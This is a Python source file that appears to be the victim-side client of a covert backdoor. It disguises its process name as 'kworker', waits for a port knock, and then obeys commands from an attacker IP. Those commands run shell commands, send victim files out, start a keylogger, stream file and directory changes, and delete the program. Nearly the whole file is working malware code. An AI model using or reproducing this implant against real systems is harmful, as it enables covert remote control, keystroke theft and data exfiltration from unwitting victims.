import signal
import sys
import subprocess
import threading

from pathlib import Path

from setproctitle import setproctitle

from scapy.all import *

from mods.protocol import send_data, receive_data, send_ack_packet, send_fin_packet
from mods.knocking import wait_for_knock
from mods.keylogger import start_keylogger, stop_keylogger
from mods.monitoring import watch_file, watch_directory
from mods.shared import get_ip_address, Channel, Cfg

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="")
    p.add_argument("--ip", type=str, required=True)
    p.add_argument("--iface", type=str, default='enp2s0')
    p.add_argument("--name", type=str, default='kworker')

    return p

def run_shell_command(args) -> str:
    print(f'Running... {args}')
    res = subprocess.run(args, capture_output=True, text=True)
    if res.returncode == 0:
        return res.stdout
    else:
        return res.stderr

def _send_watch(data: bytes):
    send_data(data, src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP, channel=Channel.BACKGROUND, sleep=0)

def _wait_for_stop() -> bool:
    while True:
        signal_data = receive_data(from_ip=Cfg.ATTACKER_IP, timeout=10)
        if signal_data == b'ew':
            return True

def handle_command(cmd: str, args: list[str]) -> str:
    if cmd == 'sf':
        filename = args[0]
        send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        file_bytes = receive_data(from_ip=Cfg.ATTACKER_IP)
        save_path = Path(f'data/victim/{filename}')
        save_path.parent.mkdir(parents=True, exist_ok=True)
        save_path.write_bytes(file_bytes)
        return f'Downloaded file {filename}'
    elif cmd == 'dl':
        raw_path = args[0]
        filepath = Path(raw_path)
        if not filepath.is_file():
            return 'Unable to find the file'
        send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        file_bytes = filepath.read_bytes()
        send_data(file_bytes, src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        return f'Sent file {filepath.name}'
    elif cmd == 'rn':
        result = run_shell_command(args)
        send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        send_data(result.encode(), src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        return f'Ran command {args}'
    elif cmd == 'k+':
        result = start_keylogger()
        send_data(result.encode(), src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        return 'Keylogger started'
    elif cmd == 'k-':
        result = stop_keylogger()
        send_data(result.encode(), src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        return 'Keylogger stopped'
    elif cmd == 'wf':
        if not args or not Path(args[0]).is_file():
            send_fin_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
            return 'Invalid file path'
        send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        stop_event = threading.Event()
        t = threading.Thread(target=watch_file, args=(args[0], _send_watch, stop_event), daemon=True)
        t.start()
        _wait_for_stop()
        stop_event.set()
        t.join(timeout=3)
        return 'File watch ended'
    elif cmd == 'wd':
        if not args or not Path(args[0]).is_dir():
            send_fin_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
            return 'Invalid directory path'
        send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)
        stop_event = threading.Event()
        t = threading.Thread(target=watch_directory, args=(args[0], _send_watch, stop_event), daemon=True)
        t.start()
        _wait_for_stop()
        stop_event.set()
        t.join(timeout=3)
        return 'Directory watch ended'
    elif cmd == 'dc':
        return 'Attacker disconnected'
    elif cmd == 'un':
        uninstall()
    else:
        return 'Unrecognized command'

def uninstall():
    project_dir = Path(__file__).resolve().parent
    os.chdir(project_dir.parent)

    try:
        shutil.rmtree(project_dir)
    except Exception as e:
        print(f"Error during deletion: {e}")

    sys.exit(0)
    
def sigint_handler(sig, frame):
    print('\nExiting...')
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, sigint_handler)

    print('hello from client')

    args = build_parser().parse_args()
    my_ip = get_ip_address(args.iface)

    Cfg.IFACE = args.iface
    Cfg.ATTACKER_IP = args.ip
    Cfg.VICTIM_IP = my_ip

    print('config: ' + ', '.join('%s: %s' % item for item in vars(Cfg).items() if not item[0].startswith('__')))

    print(f'setting program name to: {args.name}')
    setproctitle(args.name)

    wait_for_knock()
    send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)

    while True:
        command = receive_data(from_ip=Cfg.ATTACKER_IP, timeout=360)
        decoded = command.decode()
        print(f'Received: {decoded}')
        parts = decoded.split(' ')
        res = handle_command(parts[0], parts[1:])
        print(res)

        if res == 'Attacker disconnected':
            wait_for_knock()
            send_ack_packet(src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP)


if __name__ == "__main__":
    main()
